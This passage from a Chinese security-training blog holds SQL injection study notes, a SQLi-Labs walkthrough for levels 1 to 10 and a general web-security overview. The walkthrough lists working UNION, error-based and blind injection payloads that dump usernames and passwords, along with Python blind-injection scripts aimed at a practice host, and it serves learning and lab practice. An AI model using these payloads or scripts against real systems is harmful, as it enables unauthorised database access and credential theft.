漏洞原理</strong></h4><ul><li><strong>定义</strong>：用户输入的数据被拼接至SQL语句，导致恶意SQL执行。</li><li><strong>核心条件</strong>：<ol><li>用户输入可控制（如URL参数<code>id=1</code>）</li><li>输入未被严格过滤（如单引号未转义）</li></ol></li></ul><h4 id="2-漏洞分类"><a href="#2-漏洞分类" class="headerlink" title="2. 漏洞分类"></a><strong>2. 漏洞分类</strong></h4><table><thead><tr><th>类型</th><th>特点描述</th></tr></thead><tbody><tr><td><strong>联合注入</strong></td><td>通过<code>UNION SELECT</code>获取数据，需页面回显支持</td></tr><tr><td><strong>报错注入</strong></td><td>利用SQL语法错误回显数据（如<code>floor()</code>函数）</td></tr><tr><td><strong>盲注</strong></td><td>无回显，通过布尔逻辑（<code>AND/OR</code>）或时间延迟（<code>SLEEP()</code>）判断结果</td></tr><tr><td><strong>二次注入</strong></td><td>注入数据存储后被二次使用（如写入数据库后触发）</td></tr><tr><td><strong>堆叠注入</strong></td><td>通过分号执行多条SQL语句（需数据库权限支持）</td></tr></tbody></table><h4 id="3-漏洞利用流程"><a href="#3-漏洞利用流程" class="headerlink" title="3. 漏洞利用流程"></a><strong>3. 漏洞利用流程</strong></h4><ol><li><strong>探测存在性</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; --+ （闭合单引号）</span></span><br><span class="line"><span class="string">   id=1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+ （验证逻辑）</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆回显位</span><br><span class="line"></span><br><span class="line">```<span class="keyword">sql</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3 --+ （确定可回显的字段位置）</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>爆数据库信息</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,DATABASE() --+ （获取当前库名）</span></span><br></pre></td></tr></table></figure><p><strong>爆表名</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,GROUP_CONCAT(table_name) </span></span><br><span class="line"><span class="string">FROM information_schema.tables </span></span><br><span class="line"><span class="string">WHERE table_schema=&#x27;</span>security<span class="string">&#x27; --+ （获取指定库的表名）</span></span><br></pre></td></tr></table></figure><p><strong>爆列名</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,GROUP_CONCAT(column_name) </span></span><br><span class="line"><span class="string">FROM information_schema.columns </span></span><br><span class="line"><span class="string">WHERE table_name=&#x27;</span>users<span class="string">&#x27; --+ （获取指定表的字段名）</span></span><br></pre></td></tr></table></figure><p><strong>爆数据</strong>：</p><ol><li><pre><code class="language-sql">id=-1&#39; UNION SELECT 1,2,GROUP_CONCAT(username,password) FROM users --+ （获取数据）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### **四、工具与实战**</span><br><span class="line"></span><br><span class="line">#### **1. 自动化工具**</span><br><span class="line"></span><br><span class="line">- **Burp Suite**：抓包分析，配合`SQLMap`插件自动化注入</span><br><span class="line">- **SQLMap**：命令行注入工具（示例：`sqlmap -u &quot;http://test.com?id=1&quot; --dbs`）</span><br><span class="line">- **Havij**：图形化注入工具（适合新手）</span><br><span class="line"></span><br><span class="line">#### **2. 靶场推荐**</span><br><span class="line"></span><br><span class="line">- **DVWA**：初级漏洞练习平台（支持 SQL 注入、XSS 等）</span><br><span class="line">- **SQLi-Labs**：专业 SQL 注入靶场（包含 25 + 种注入类型）</span><br><span class="line"></span><br><span class="line">### **五、总结与明日计划**</span><br><span class="line"></span><br><span class="line">#### **1. 今日重点**</span><br><span class="line"></span><br><span class="line">- Web 网站的四大核心组件</span><br><span class="line">- SQL 注入的原理与利用链</span><br><span class="line">- MySQL 基础操作与漏洞探测方法</span><br><span class="line"></span><br><span class="line"># sql注入漏洞过程记录</span><br><span class="line"></span><br><span class="line">## less-1</span><br><span class="line"></span><br><span class="line">![image-20250325143725664](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143725764.png)</span><br><span class="line"></span><br><span class="line">使用联合注入找寻注入点</span><br><span class="line"></span><br><span class="line">![image-20250325143754575](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143754654.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image-20250325143915816](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325143916023.png)</span><br><span class="line"></span><br><span class="line">![image-20250325144749855](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325144749936.png)</span><br><span class="line"></span><br><span class="line">![image-20250325145349996](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325145350073.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>payload：-1&#39; union select 1,2,group_concat(username,password) from users  --+</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## less-2</span><br><span class="line"></span><br><span class="line">![image-20250327113226028](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327113226215.png)</span><br><span class="line"></span><br><span class="line">和less-1类似，但是是数字型注入，payload：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?id&#x3D;0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’; –+<br>?id&#x3D;0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;”security” and table_name&#x3D;”users” –+<br>?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from security.users –+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## less-3</span><br><span class="line"></span><br><span class="line">首先进行探测</span><br><span class="line"></span><br><span class="line">![image-20250327114007777](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114007867.png)</span><br><span class="line"></span><br><span class="line">发现没有闭合，试着闭合联合注入</span><br><span class="line"></span><br><span class="line">![image-20250327114202757](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114203001.png)</span><br><span class="line"></span><br><span class="line">成功显示，其余步骤和less-2一样,payload:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?id&#x3D;-1’) union select 1,2,group_concat(username,password) from users –+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20250327114553664](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327114553871.png)</span><br><span class="line"></span><br><span class="line">## less-4</span><br><span class="line"></span><br><span class="line">探测发现为&quot;)</span><br><span class="line"></span><br><span class="line">![image-20250327115649991](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115650261.png)</span><br><span class="line"></span><br><span class="line">![image-20250327115630386](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115630462.png)</span><br><span class="line"></span><br><span class="line">其余payload和less-3一样</span><br><span class="line"></span><br><span class="line">![image-20250327115745058](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115745312.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload: id&#x3D;-1”) union select 1,2,group_concat(username,password) from users –+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## less-5</span><br><span class="line"></span><br><span class="line">![image-20250327115958516](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327115958757.png)</span><br><span class="line"></span><br><span class="line">发现只有报错没有回显，报错注入</span><br><span class="line"></span><br><span class="line">![image-20250327120056474](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327120056740.png)</span><br><span class="line"></span><br><span class="line">![image-20250327121123265](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121123340.png)</span><br><span class="line"></span><br><span class="line">![image-20250327121559237](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121559502.png)</span><br><span class="line"></span><br><span class="line">![image-20250327121641937](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121642167.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：<br>id&#x3D;1’ and updatexml(0x7e,concat(0x7e,database()),0x7e) –+<br>id&#x3D;-1’ and updatexml(0x7e,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),0x7e) –+<br>id&#x3D;-1’ and updatexml(0x7e,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;”security” and table_name&#x3D;”users”)),0x7e) –+<br>id&#x3D;-1’ and updatexml(0x7e,concat(0x7e,(select group_concat(username) from users)),0x7e) –+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## less-6</span><br><span class="line"></span><br><span class="line">报错注入和less-5类似，不同点在双引号</span><br><span class="line"></span><br><span class="line">![image-20250327121930723](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121930809.png)</span><br><span class="line"></span><br><span class="line">![image-20250327121957109](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327121957339.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：<br>id &#x3D; -1’ and updatexml(0x7e,concat(0x7e,(select group_concat(username) from users)),0x7e) –+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## less-7</span><br><span class="line"></span><br><span class="line">探测发现为中文单引号闭合</span><br><span class="line"></span><br><span class="line">![image-20250327122530841](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327122530913.png)</span><br><span class="line"></span><br><span class="line">提示写入文件</span><br><span class="line"></span><br><span class="line">## less-8</span><br><span class="line"></span><br><span class="line">根据csdn复现，布尔盲注、脚本攻击等</span><br><span class="line"></span><br><span class="line">![image-20250327123109343](https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327123109498.png)</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_database(url):</span><br><span class="line">    name = &#x27;&#x27;  # 初始化一个空字符串用于存储数据库名</span><br><span class="line">    letters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&amp;*&#x27;  # 包含可能的字符列表</span><br><span class="line"></span><br><span class="line">    # 循环每个数据库名的字符位置</span><br><span class="line">    for i in range(1, 20):  # 假设数据库名最长为20个字符</span><br><span class="line">        # 循环尝试每个可能的字符</span><br><span class="line">        for j in letters:</span><br><span class="line">            # 构造盲注payload</span><br><span class="line">            payload = &quot;1&#x27; AND SUBSTRING((SELECT DATABASE()), %d, 1) = &#x27;%s&#x27;-- &quot; % (i, j)</span><br><span class="line">            # 发送请求</span><br><span class="line">            res = requests.get(url, params=&#123;&quot;id&quot;: payload&#125;)</span><br><span class="line">            # 检查响应是否包含特定字符串，即数据库名</span><br><span class="line">            if &quot;You are in&quot; in res.text:</span><br><span class="line">                # 找到一个字符后，将其添加到数据库名中</span><br><span class="line">                name += j</span><br><span class="line">                print(name)  # 打印当前已获取的数据库名</span><br><span class="line">                break  # 跳出当前循环，继续下一个位置的字符</span><br><span class="line"></span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 目标URL</span><br><span class="line">url = &#x27;http://49.232.171.41/Less-8/&#x27;</span><br><span class="line"># 调用函数获取数据库名</span><br><span class="line">db_name = get_database(url)</span><br><span class="line">print(&quot;Database Name:&quot;, db_name)</span><br></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>确定是闭合方式为单引号的时间盲注</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250327123726170.png" alt="image-20250327123725961"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://49.232.171.41/Less-9/&quot;</span> <span class="comment">#填入url</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r =<span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1&#x27; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;?id=1&#x27; and if((ascii(substr((select group_concat(username,password) from security.users),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = datetime.datetime.now()<span class="comment">#获取请求前的时间</span></span><br><span class="line">        html = requests.get(url+<span class="built_in">str</span>)</span><br><span class="line">        time2  = datetime.datetime.now()<span class="comment">#获取请求后的时间</span></span><br><span class="line">        c = (time2-time1).seconds<span class="comment">#两个时间相减得到页面延迟</span></span><br><span class="line">        <span class="built_in">print</span>(url+<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;=<span class="number">2</span>:<span class="comment">#因为sleep(2)所以这就是我们比对的依据</span></span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span>,result)</span><br></pre></td></tr></table></figure><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>确定是闭合方式为双引号的时间盲注，对less-9脚本稍作修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8077/sql/Less-10/&quot;</span> <span class="comment">#填入url</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r =<span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#str = &quot;?id=1\&quot; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;.format(i, mid)</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;?id=1\&quot; and if((ascii(substr((select group_concat(username,password) from security.users),&#123;0&#125;,1))&gt;&#123;1&#125;),sleep(2),1)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        time1 = datetime.datetime.now()<span class="comment">#获取请求前的时间</span></span><br><span class="line">        html = requests.get(url+<span class="built_in">str</span>)</span><br><span class="line">        time2  = datetime.datetime.now()<span class="comment">#获取请求后的时间</span></span><br><span class="line">        c = (time2-time1).seconds<span class="comment">#两个时间相减得到页面延迟</span></span><br><span class="line">        <span class="built_in">print</span>(url+<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;=<span class="number">2</span>:<span class="comment">#因为sleep(2)所以这就是我们比对的依据</span></span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span>,result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;实训记录1&#39;</title>
      <link href="/2025/03/24/shi-xun-ji-lu-1/"/>
      <url>/2025/03/24/shi-xun-ji-lu-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全学习日志-第一天"><a href="#Web安全学习日志-第一天" class="headerlink" title="Web安全学习日志 - 第一天"></a>Web安全学习日志 - 第一天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol><li>理解Web安全的核心概念与发展历程</li><li>掌握漏洞分类及常见攻击类型</li><li>了解网络安全行业的服务模式与攻防演练机制</li><li>明确渗透测试工程师的职业路径</li></ol><h3 id="一、Web安全基础概念"><a href="#一、Web安全基础概念" class="headerlink" title="一、Web安全基础概念"></a><strong>一、Web安全基础概念</strong></h3><h4 id="1-Web安全的定义"><a href="#1-Web安全的定义" class="headerlink" title="1. Web安全的定义"></a><strong>1. Web安全的定义</strong></h4><ul><li><strong>Web系统</strong>：由网页、小程序、客户端和服务器端组成的交互式系统。</li><li><strong>核心目标</strong>：保护Web系统的机密性、完整性和可用性，防止未经授权的访问、数据泄露或服务中断。</li></ul><h4 id="2-Web安全的发展历程"><a href="#2-Web安全的发展历程" class="headerlink" title="2. Web安全的发展历程"></a><strong>2. Web安全的发展历程</strong></h4><table><thead><tr><th>代际</th><th>时间范围</th><th>特点描述</th></tr></thead><tbody><tr><td>第一代</td><td>2000-2005年</td><td>基础安全防护（如防火墙、杀毒软件）</td></tr><tr><td>第二代</td><td>2006-2010年</td><td>漏洞平台兴起（乌云、吐司），社区驱动漏洞挖掘</td></tr><tr><td>第三代</td><td>2011-2015年</td><td>企业级安全方案出现，攻防对抗常态化</td></tr><tr><td>第四代</td><td>2016年至今</td><td>系统化培养机制形成，安全合规要求提升（如等保2.0）</td></tr></tbody></table><h4 id="3-漏洞与Bug的区别"><a href="#3-漏洞与Bug的区别" class="headerlink" title="3. 漏洞与Bug的区别"></a><strong>3. 漏洞与Bug的区别</strong></h4><ul><li><strong>漏洞</strong>：可被利用造成危害的缺陷（如SQL注入、XSS）。</li><li><strong>Bug</strong>：程序设计过程中的逻辑错误（可能不直接导致安全风险）。</li></ul><h3 id="二、Web安全领域分支"><a href="#二、Web安全领域分支" class="headerlink" title="二、Web安全领域分支"></a><strong>二、Web安全领域分支</strong></h3><h4 id="1-客户端漏洞（前端）"><a href="#1-客户端漏洞（前端）" class="headerlink" title="1. 客户端漏洞（前端）"></a><strong>1. 客户端漏洞（前端）</strong></h4><ul><li><strong>常见类型</strong>：XSS（跨站脚本）、CSRF（跨站请求伪造）、CORS配置错误。</li></ul><h4 id="2-服务端漏洞（后端）"><a href="#2-服务端漏洞（后端）" class="headerlink" title="2. 服务端漏洞（后端）"></a><strong>2. 服务端漏洞（后端）</strong></h4><ul><li><strong>常见类型</strong>：SQL注入、文件上传漏洞、RCE（远程代码执行）、SSRF（服务器端请求伪造）。</li></ul><h4 id="3-业务逻辑漏洞"><a href="#3-业务逻辑漏洞" class="headerlink" title="3. 业务逻辑漏洞"></a><strong>3. 业务逻辑漏洞</strong></h4><ul><li><strong>特点</strong>：依赖业务流程设计缺陷（如越权访问、支付逻辑漏洞）。</li></ul><h3 id="三、网络安全行业服务模式"><a href="#三、网络安全行业服务模式" class="headerlink" title="三、网络安全行业服务模式"></a><strong>三、网络安全行业服务模式</strong></h3><h4 id="1-企业安全防护"><a href="#1-企业安全防护" class="headerlink" title="1. 企业安全防护"></a><strong>1. 企业安全防护</strong></h4><ul><li><strong>外包模式</strong>：聘请网安公司（如启明星辰、绿盟科技）提供安全服务。</li><li><strong>自建部门</strong>：成立内部安全团队，负责产品与基础设施的防护。</li></ul><h4 id="2-攻防演练（护网行动）"><a href="#2-攻防演练（护网行动）" class="headerlink" title="2. 攻防演练（护网行动）"></a><strong>2. 攻防演练（护网行动）</strong></h4><ul><li><strong>结构</strong>：<ul><li><strong>红队</strong>（攻击队）：15-40家，模拟黑客攻击。</li><li><strong>蓝队</strong>（防守队）：300-400个单位，防御攻击。</li><li><strong>裁判组</strong>：公安部直属机构（如一所、三所）。</li></ul></li><li><strong>类型</strong>：<ul><li><strong>国家级</strong>：公安部护网（2周，常态化6个月）。</li><li><strong>省级</strong>：磐石、深蓝等。</li><li><strong>行业级</strong>：教育、医疗、金融等领域专项演练。</li></ul></li></ul><h3 id="四、渗透测试工程师职业路径"><a href="#四、渗透测试工程师职业路径" class="headerlink" title="四、渗透测试工程师职业路径"></a><strong>四、渗透测试工程师职业路径</strong></h3><h4 id="1-核心技能"><a href="#1-核心技能" class="headerlink" title="1. 核心技能"></a><strong>1. 核心技能</strong></h4><ul><li><strong>Web安全</strong>：XSS、SQL注入、文件上传等漏洞挖掘。</li><li><strong>工具链</strong>：Kali Linux、Burp Suite、Nessus。</li><li><strong>编程能力</strong>：Python、C语言、脚本编写。</li></ul><h4 id="2-学习资源"><a href="#2-学习资源" class="headerlink" title="2. 学习资源"></a><strong>2. 学习资源</strong></h4><ul><li><strong>CTF竞赛</strong>：Web、Pwn、逆向、区块链等题型。</li><li><strong>实战平台</strong>：Hack The Box、TryHackMe。</li><li><strong>经典书籍</strong>：《Web前端黑客技术揭秘》、《白帽子讲Web安全》。</li></ul><h3 id="五、Web技术栈与安全问题"><a href="#五、Web技术栈与安全问题" class="headerlink" title="五、Web技术栈与安全问题"></a><strong>五、Web技术栈与安全问题</strong></h3><h4 id="1-Web发展阶段"><a href="#1-Web发展阶段" class="headerlink" title="1. Web发展阶段"></a><strong>1. Web发展阶段</strong></h4><ul><li><strong>1.0</strong>：静态网页（HTML为主）。</li><li><strong>2.0</strong>：动态交互（PHP、Java）。</li><li><strong>3.0</strong>：去中心化（区块链、智能合约）。</li></ul><h4 id="2-关键组件"><a href="#2-关键组件" class="headerlink" title="2. 关键组件"></a><strong>2. 关键组件</strong></h4><ul><li><strong>前端</strong>：HTML、CSS、JavaScript（易受XSS攻击）。</li><li><strong>后端</strong>：PHP、Java、Node.js（需防御SQL注入）。</li><li><strong>数据库</strong>：MySQL、Redis（防止未授权访问）。</li><li><strong>中间件</strong>：Apache、Nginx（关注配置漏洞）。</li></ul><h3 id="明日学习计划"><a href="#明日学习计划" class="headerlink" 